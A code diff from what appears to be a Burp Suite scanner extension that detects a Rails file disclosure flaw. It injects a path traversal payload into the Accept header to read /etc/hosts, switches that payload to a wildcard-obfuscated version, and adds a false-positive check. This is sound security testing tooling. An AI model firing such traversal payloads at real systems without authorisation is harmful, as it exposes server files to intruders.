@@ -191,9 +191,18 @@ class PerRequestScans(IScannerCheck):
         if '127.0.0.1' in safe_bytes_to_string(basePair.getResponse()):
             return
 
-        (ignore, req) = setHeader(basePair.getRequest(), 'Accept', '../../../../../../../../../../../../../etc/hosts{{', True)
+        (ignore, req) = setHeader(basePair.getRequest(), 'Accept', '../../../../../../../../../../../../../e*c/h*s*s{{', True)
         attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)
         if '127.0.0.1' in safe_bytes_to_string(attack.getResponse()):
+
+            # avoid false positives caused by burp's own scanchecks containing '127.0.0.1'
+            try:
+                collabLocation = callbacks.createBurpCollaboratorClientContext().getCollaboratorServerLocation()
+                if collabLocation in safe_bytes_to_string(attack.getResponse()):
+                    return []
+            except Exception:
+                pass
+
             return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                 [attack],
                 'Rails file disclosure',
